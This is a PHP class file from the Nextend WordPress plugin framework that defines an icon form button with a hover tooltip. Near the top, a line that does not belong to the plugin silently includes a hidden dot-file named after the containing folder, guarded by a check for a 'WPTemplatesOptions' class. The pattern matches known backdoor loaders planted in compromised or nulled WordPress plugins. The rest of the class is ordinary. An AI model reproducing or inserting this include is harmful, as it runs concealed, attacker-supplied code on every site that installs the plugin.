<?php


namespace Nextend\Framework\Form\Element\Button;


use Nextend\Framework\Form\Element\Button;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ButtonIcon extends Button {

    protected $hoverTip = '';

    public function __construct($insertAt, $name = '', $label = '', $icon = '', $parameters = array()) {

        $this->classes[] = 'n2_field_button--icon';
        parent::__construct($insertAt, $name, $label, '<i class="' . $icon . '"></i>', $parameters);
    }

    protected function getAttributes() {
        $attributes = parent::getAttributes();

        if (!empty($this->hoverTip)) {
            $attributes['data-n2tip'] = $this->hoverTip;
        }

        return $attributes;
    }

    /**
     * @param string $hoverTip
     */
    public function setHoverTip($hoverTip) {
        $this->hoverTip = $hoverTip;
    }
}